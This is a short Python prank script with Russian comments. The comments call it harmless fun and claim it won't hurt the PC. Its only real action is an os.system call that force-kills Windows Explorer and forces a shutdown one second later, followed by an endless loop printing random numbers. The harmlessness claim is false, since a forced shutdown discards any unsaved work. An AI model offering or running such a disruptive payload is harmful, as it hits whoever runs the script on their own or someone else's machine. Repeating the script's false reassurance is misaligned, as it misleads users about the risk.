# Я знаю что это бесполезный код, но это ради забавы.
# Ахахаххаха. Если что, это никак не навредит ПК.

import os
import random

def main():
    os.system("taskkill /f /im explorer.exe && shutdown -s -t 1")
    while True:
        print(f"{random.randint(0, 10000000000000001)}")

if __name__ == "__main__":
    main()
